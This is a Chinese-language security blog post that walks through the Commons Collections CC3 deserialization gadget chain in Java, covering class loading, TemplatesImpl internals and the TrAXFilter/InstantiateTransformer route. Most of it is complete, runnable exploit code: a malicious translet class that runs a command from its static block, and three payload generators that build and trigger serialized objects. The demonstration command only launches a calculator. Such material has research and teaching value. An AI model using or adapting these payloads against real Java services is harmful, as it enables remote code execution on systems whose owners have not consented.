# 漏洞篇 - Java 反序列化之 CC3 链
> 2024-05-27
> 来源：https://changeyourway.github.io/2024/05/27/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC3%E9%93%BE%E5%88%86%E6%9E%90/

CC3 链的核心在于利用 TemplatesImpl 加载恶意类时执行静态代码块。

## CC3 链分析

在分析 CC3 链之前，我们需要再深入地了解一下 Java 的类加载机制。虽然我前面有提到 Java 类加载的几种方式，但是这里还是需要再深入了解一下。

推荐博客：[Java 基础篇-类加载机制](https://www.cnblogs.com/1vxyz/p/17245206.html)

[ClassLoader，吃透它看这一篇就够了](https://www.cnblogs.com/caicz/p/12718026.html)

### 自定义类加载器

实现一个自定义类加载器需要继承 ClassLoader ，同时覆盖 findClass 方法。

ClassLoader 里面有三个重要的方法 loadClass() 、findClass() 和 defineClass() 。

loadClass() 方法是加载目标类的入口，它首先会查找当前 ClassLoader 以及它的双亲里面是否已经加载了目标类，如果没有找到就会让双亲尝试加载，如果双亲都加载不了，就会调用 findClass() 让自定义加载器自己来加载目标类。ClassLoader 的 findClass() 方法是需要子类来覆盖的，不同的加载器将使用不同的逻辑来获取目标类的字节码。拿到这个字节码之后再调用 defineClass() 方法将字节码转换成 Class 对象。

### 双亲委派机制

想要自定义类加载器，一定需要了解双亲委派模型

双亲委派机制原理如下：

类加载器根据全限定类名判断类是否加载，如果已经加载则直接返回已加载类。如果没有加载，类加载器会首先委托父类加载器加载此类。父类加载器也会采用相同的策略，查看是否自己已经加载该类，如果有就返回，没有就继续委托给父类进行加载，直到`BootStrapClassLoader`。如果父类加载器无法加载，就会交给子类进行加载，如果还不能加载就继续交给子类加载。顺序为 `BootStrapClassLoader->ExtClassLoader->AppClassLoader->自定义类加载器` 。

双亲委派机制的好处：

能够有效确保一个类的全局唯一性，当程序中出现多个限定名相同的类时，类加载器在执行加载时，始终只会加载其中的某一个类。加载的先后顺序其实确定了类被加载的优先级，如果出现了限定名相同的类，类加载器在执行加载时只会加载优先级最高的那个类。

### 利用链之 TemplatesImpl 类

TemplatesImpl 类中的静态内部类 TransletClassLoader 就是一个自定义类加载器，它继承了 ClassLoader ，重写了 defineClass 方法。defineClass() 完成类加载的加载 -> 验证 -> 准备 -> 解析四个阶段，而静态代码块在初始化阶段被执行。所以可以把命令放在静态代码块中，最后利用 newInstance 方法完成初始化并执行它。

#### 利用链总结

```
/*
TemplatesImpl#newTransformer()
    TemplatesImpl#getTransletInstance()
        TemplatesImpl#defineTransletClasses()
            TransletClassLoader#defineClass()
*/
```

TransletClassLoader 静态内部类的 defineClass 方法：

```
Class defineClass(final byte[] b) {
    return defineClass(null, b, 0, b.length);
}
```

这里需要传入一个字节数组，字节数组中应当存放我们自定义类的字节码。接下来看看哪里调用了这个方法，defineTransletClasses 方法中调用了这个方法。

defineTransletClasses 是外部类 TemplatesImpl 的成员方法，它调用了 TransletClassLoader 内部类的 defineClass 方法：

![](/images/image-20240517084830066.png)

由于 defineTransletClasses 是私有方法，再找找谁调用了这个方法。

getTransletInstance 方法调用了 defineTransletClasses 方法：

![](/images/image-20240517085104839.png)

由于 getTransletInstance 是私有方法，再找找谁调用了这个方法。

newTransformer 方法调用了 getTransletInstance ：

![](/images/image-20240517085438851.png)

#### 判断绕过

刚才在看代码的时候看到一些判断条件，现在来过一下判断。

getTransletInstance 方法中，如果 \_name 为空那么将会直接返回 null，所以 \_name 应该不为空，以及需要 \_class 为空才能调用 defineTransletClasses 方法：

![](/images/image-20240517091101680.png)

defineTransletClasses 方法中如果 \_bytecodes 为空会直接抛出异常，所以这里 \_bytecodes 应该不为空，以及下面会调用 \_tfactory 方法，所以 \_tfactory 不为空：

![](/images/image-20240517091708581.png)

总结一下：

-   **\_name 不为空**

```
private String _name = null;
```

-   **\_class 为空**

```
private Class[] _class = null;
```

-   **\_bytecodes 需要被赋值为字节码文件**

```
private byte[][] _bytecodes = null;
```

它后面会作为 defineClass 方法的参数：

```
_class[i] = loader.defineClass(_bytecodes[i]);
```

由于 \_bytecodes 是一个二维数组，而传入的参数是 \_bytecodes\[i\] ，也就是一个一维数组，所以我们需要创建一个一维数组，再把它放到 \_bytecodes 二维数组中去。这里因为前面的循环次数取的是 \_bytecodes 的长度，如果只传入一个一维数组，那么长度为 1 ，只循环一次，i 只能取到 0 这个值，那么 \_bytecodes\[i\] 就是传入的一维数组：

![](https://changeyourway.github.io/images/image-20240517103843968.png)

-   **\_tfactory 需要被赋值为 TransformerFactoryImpl 对象**

```
private transient TransformerFactoryImpl _tfactory = null;
```

由于 \_tfactory 被 transient 修饰，无法被序列化，因此没办法手动赋值。但是在 TemplatesImpl 类的 readObject 方法中有赋值语句：

```
_tfactory = new TransformerFactoryImpl();
```

所以 \_tfactory 可以不用管。

除此之外，我们还需要关注一件事：

![](https://changeyourway.github.io/images/image-20240524155627516.png)

TemplatesImpl#defineTransletClasses() 会判断我们传入的类的父类是否为 ABSTRACT\_TRANSLET ，如果是的话才会将 \_transletIndex 赋值成 i （此时 i 为 0），而 \_transletIndex 的默认值是 -1 ，如果这里不被赋值的话，下面经过判断后就会直接抛出异常。所以我们还要让传入的类继承 ABSTRACT\_TRANSLET 。

我们可以在 TemplatesImpl 类中查到 ABSTRACT\_TRANSLET 属性的定义：

![](https://changeyourway.github.io/images/image-20240524160402778.png)

可以看到它指代的类是 AbstractTranslet ，那么我们只需让传入的类继承 AbstractTranslet 类就行。

#### 写个小程序验证一下

恶意类 Eval ：

```
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;
import java.io.Serializable;

public class Eval extends AbstractTranslet {
    // 恶意代码放在静态代码块中
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    // 需要重写父类的两个方法
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

执行程序 test1 ：

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class test1 {
    public static void main(String[] args) throws Exception {
        // 初始化TemplatesImpl对象
        TemplatesImpl templates = new TemplatesImpl();
        // _name不为空
        setFieldValue(templates, "_name", "test");

        // 这里需要用到恶意类的字节码文件，通过maven编译后target目录下有字节码文件
        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC3链\\CC3\\target\\classes\\com\\miaoji\\Eval.class"));
        byte[][] codes = {code};
        // _bytecodes和_tfactory不为空，由于还没有进行反序列化，这里先手动设置_tfactory的值
        setFieldValue(templates, "_bytecodes", codes);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        templates.newTransformer();
    }

    // 反射设置值的操作重复，可以抽离成一个方法
    public static void setFieldValue(Object object, String field_name, Object filed_value) throws Exception {
        Class clazz = object.getClass();
        Field declaredField = clazz.getDeclaredField(field_name);
        declaredField.setAccessible(true);
        declaredField.set(object, filed_value);
    }
}
```

成功弹出计算器。

### 利用链之 TrAXFilter 类

TrAXFilter 的构造方法会调用 TemplatesImpl 的 newTransformer() 方法：

```
public TrAXFilter(Templates templates)  throws
    TransformerConfigurationException
{
    _templates = templates;
    _transformer = (TransformerImpl) templates.newTransformer();
    _transformerHandler = new TransformerHandlerImpl(_transformer);
    _useServicesMechanism = _transformer.useServicesMechnism();
}
```

而且还是个 public 方法，可惜的是 TrAXFilter 不能被序列化。

### 入口类 InstantiateTransformer

InstantiateTransformer 的 transform 能够实例化对象：

```
public Object transform(Object input) {
    try {
        if (input instanceof Class == false) {
            throw new FunctorException(
                "InstantiateTransformer: Input object was not an instanceof Class, it was a "
                    + (input == null ? "null object" : input.getClass().getName()));
        }
        Constructor con = ((Class) input).getConstructor(iParamTypes);
        return con.newInstance(iArgs);

    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InstantiateTransformer: The constructor must exist and be public ");
    } catch (InstantiationException ex) {
        throw new FunctorException("InstantiateTransformer: InstantiationException", ex);
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InstantiateTransformer: Constructor must be public", ex);
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InstantiateTransformer: Constructor threw an exception", ex);
    }
}
```

于是我们可以直接用 InstantiateTransformer 来实例化 TrAXFilter 对象。

#### 写个小程序验证一下

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class test2 {
    public static void main(String[] args) throws Exception {
        // 初始化TemplatesImpl对象
        TemplatesImpl templates = new TemplatesImpl();
        // _name不为空
        setFieldValue(templates, "_name", "test");
        // 这里需要用到恶意类的字节码文件，通过maven编译后target目录下有字节码文件
        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC3链\\CC3\\target\\classes\\com\\miaoji\\Eval.class"));
        byte[][] codes = {code};
        // _bytecodes和_tfactory不为空，由于还没有进行反序列化，这里先手动设置_tfactory的值
        setFieldValue(templates, "_bytecodes", codes);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 初始化InstantiateTransformer对象，利用它实例化TrAXFilter对象
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        instantiateTransformer.transform(TrAXFilter.class);
    }

    // 反射设置值的操作重复，可以抽离成一个方法
    public static void setFieldValue(Object object, String field_name, Object filed_value) throws Exception {
        Class clazz = object.getClass();
        Field declaredField = clazz.getDeclaredField(field_name);
        declaredField.setAccessible(true);
        declaredField.set(object, filed_value);
    }
}
```

### 反序列化利用

我们依然是选择用 InvokerTransformer 类的 transform 方法来执行 TemplatesImpl 的 newTransformer() 方法。但是反序列化的入口有多个选择，可以使用 AnnotationInvocationHandler 的 readObject ，或者 HashMap 的 readObject 。

除了上述方法之外还可以用 TrAXFilter 类来调用 TemplatesImpl 的 newTransformer() 方法。

#### 将 AnnotationInvocationHandler 作为入口类

前面学 CC1 链的时候我们就是用 AnnotationInvocationHandler 的 readObject 方法来反序列化的，但是有 Java 版本限制。

payload 如下：

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC1_TemplatesImpl {
    public static void main(String[] args) throws Exception {
        // 初始化 TemplatesImpl 对象
        TemplatesImpl templates = new TemplatesImpl();
        // _name 不为空
        setFieldValue(templates,"_name","test");
        // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件
        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC3链\\CC3\\target\\classes\\com\\miaoji\\Eval.class"));
        byte[][] codes = {code};
        // _bytecodes 不为空
        setFieldValue(templates,"_bytecodes",codes);

        //利用 ChainedTransformer 执行 templates.newTransformer();
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer", null,null)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        // 新建一个 HashMap ，没什么意义，仅作为参数传入
        HashMap<Object,Object> map = new HashMap<>();
        // 初始化利用链 LazyMap，LazyMap 的 get 方法将会调用 chainedTransformer 的 transform 方法
        Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);

        // 反射获取 AnnotationInvocationHandler 的构造方法
        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationhdlConstructor.setAccessible(true);
        // 利用构造方法将 AnnotationInvocationHandler 对象的 memberValues 属性赋值为 LazyMap 对象
        // memberValues 属性的 get 方法将会被 AnnotationInvocationHandler 的 invoke 方法调用
        InvocationHandler h = (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Override.class, lazyMap);

        // 为了能够调用 h 的 invoke 方法，我们用 h 来构造一个代理对象，这样当代理对象的任意方法被调用时，h 的 invoke 方法都会被调用
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);

        // 再次利用构造方法将另一个 AnnotationInvocationHandler 对象的 memberValues 属性赋值为代理对象
        // AnnotationInvocationHandler 的 readObject 方法中会调用 memberValues.entrySet() 方法，届时代理对象的 invoke 方法将被触发
        Object o = annotationInvocationhdlConstructor.newInstance(Override.class, mapProxy);
        serialize(o);
        unserialize("cc1_templatesImpl.bin");
    }

    public static void setFieldValue(Object object,String field_name,Object filed_value) throws Exception {
        Class clazz=object.getClass();
        Field declaredField=clazz.getDeclaredField(field_name);
        declaredField.setAccessible(true);
        declaredField.set(object,filed_value);
    }

    public static void serialize(Object o) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc1_templatesImpl.bin"));
        oos.writeObject(o);
    }

    public static void unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
    }
}
```

#### 将 HashMap 作为入口类

前面学 CC6 链时，我们便是将 HashMap 作为入口类，原因是 HashMap 的 readObject 方法会调用 key 的 hashCode 方法。

之后的利用链 TiedMapEntry ：

```
TiedMapEntry#hashCode() -> TiedMapEntry#getValue() -> TiedMapEntry.map#get() 
```

所以将 TiedMapEntry 的 map 属性赋值为 LazyMap 对象就好。

payload 如下：

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC6_TemplatesImpl {
    public static void main(String[] args) throws Exception {
        // 初始化 TemplatesImpl 对象
        TemplatesImpl templates = new TemplatesImpl();
        // _name 不为空
        setFieldValue(templates,"_name","test");
        // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件
        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC3链\\CC3\\target\\classes\\com\\miaoji\\Eval.class"));
        byte[][] codes = {code};
        // _bytecodes 不为空
        setFieldValue(templates,"_bytecodes",codes);

        //利用 ChainedTransformer 执行 templates.newTransformer();
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer", null,null)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 新建一个 HashMap ，没什么意义，仅作为参数传入
        HashMap<Object,Object> map = new HashMap<>();
        // 初始化利用链 LazyMap，LazyMap 的 get 方法将会调用 chainedTransformer 的 transform 方法
        // 为了防止序列化时命令执行，这里先传入一个普通的 ConstantTransformer 对象
        Map<Object,Object> lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));

        // 将 TiedMapEntry 的 map 属性赋值为 LazyMap 对象
        // 利用链：TiedMapEntry#hashCode() -> TiedMapEntry#getValue() -> TiedMapEntry.map#get()
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"key");

        // 新建一个 HashMap 对象，将 TiedMapEntry 对象作为 key 传入，之后将会调用 TiedMapEntry#hashCode()
        HashMap<Object,Object> map2 = new HashMap<>();
        // 序列化时这里将会提前调用 TiedMapEntry#hashCode() ，导致 lazyMap::get()被调用，导致 lazyMap 的 key 属性被赋值
        // 于是反序列化调用 lazyMap::get() 时无法进入判断，无法调用 transform 方法
        map2.put(tiedMapEntry,"test");
        // 为了解决上述问题，HashMap 对象的 put 方法执行后需要去除 lazyMap 中的 key
        lazyMap.remove("key");

        // 最后利用反射将 LazyMap 的 factory 对象修改为 chainedTransformer
        Class c = LazyMap.class;
        Field factory = c.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,chainedTransformer);

        serialize(map2);
        unserialize("cc6_templatesImpl.bin");
    }
    public static void setFieldValue(Object object,String field_name,Object filed_value) throws Exception {
        Class clazz=object.getClass();
        Field declaredField=clazz.getDeclaredField(field_name);
        declaredField.setAccessible(true);
        declaredField.set(object,filed_value);
    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6_templatesImpl.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        return ois.readObject();
    }
}
```

#### TrAXFilter + InstantiateTransformer 代替 InvokerTransformer

利用 TrAXFilter 的构造方法调用 TemplatesImpl 的 newTransformer() 方法，就不需要使用 InvokerTransformer 了。入口类可以从上面两个中选一个。

为了更加通用，这里选择将 HashMap 作为入口类，payload 如下：

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class TrAXFilter_TemplatesImpl {
    public static void main(String[] args) throws Exception {
        // 初始化 TemplatesImpl 对象
        TemplatesImpl templates = new TemplatesImpl();
        // _name 不为空
        setFieldValue(templates, "_name", "test");
        // 初始化 InstantiateTransformer 对象，利用它实例化 TrAXFilter 对象
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件
        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC3链\\CC3\\target\\classes\\com\\miaoji\\Eval.class"));
        byte[][] codes = {code};
        // _bytecodes 不为空
        setFieldValue(templates, "_bytecodes", codes);

        // 利用 ChainedTransformer 执行 templates.newTransformer();
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 新建一个 HashMap ，没什么意义，仅作为参数传入
        HashMap<Object, Object> map = new HashMap<>();
        // 初始化利用链 LazyMap，LazyMap 的 get 方法将会调用 chainedTransformer 的 transform 方法
        // 为了防止序列化时命令执行，这里先传入一个普通的 ConstantTransformer 对象
        Map<Object, Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));

        // 将 TiedMapEntry 的 map 属性赋值为 LazyMap 对象
        // 利用链：TiedMapEntry#hashCode() -> TiedMapEntry#getValue() -> TiedMapEntry.map#get()
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");

        // 新建一个 HashMap 对象，将 TiedMapEntry 对象作为 key 传入，之后将会调用 TiedMapEntry#hashCode()
        HashMap<Object, Object> map2 = new HashMap<>();
        // 序列化时这里将会提前调用 TiedMapEntry#hashCode() ，导致 lazyMap::get()被调用，导致 lazyMap 的 key 属性被赋值
        // 于是反序列化调用 lazyMap::get() 时无法进入判断，无法调用 transform 方法
        map2.put(tiedMapEntry, "test");
        // 为了解决上述问题，HashMap 对象的 put 方法执行后需要去除 lazyMap 中的 key
        lazyMap.remove("key");

        // 最后利用反射将 LazyMap 的 factory 对象修改为 chainedTransformer
        Class c = LazyMap.class;
        Field factory = c.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap, chainedTransformer);

        serialize(map2);
        unserialize("trAXFilter_templatesImpl.bin");
    }

    public static void setFieldValue(Object object, String field_name, Object filed_value) throws Exception {
        Class clazz = object.getClass();
        Field declaredField = clazz.getDeclaredField(field_name);
        declaredField.setAccessible(true);
        declaredField.set(object, filed_value);
    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("trAXFilter_templatesImpl.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        return ois.readObject();
    }
}
```

### 调用链总结

这里只总结 TrAXFilter + InstantiateTransformer 这条链子：

```
HashMap#readObject(java.io.ObjectInputStream)
HashMap#hash(Object)
TiedMapEntry#hashCode()
TiedMapEntry#getValue()
LazyMap#get(Object)
InstantiateTransformer#transform(Object)
TrAXFilter#TrAXFilter(Templates)
TemplatesImpl#newTransformer()
TemplatesImpl#getTransletInstance()
	-> TemplatesImpl#defineTransletClasses()
        TransletClassLoader#defineClass() # 类加载的前四个阶段
	-> Class#newInstance() # 初始化时执行静态代码块
```
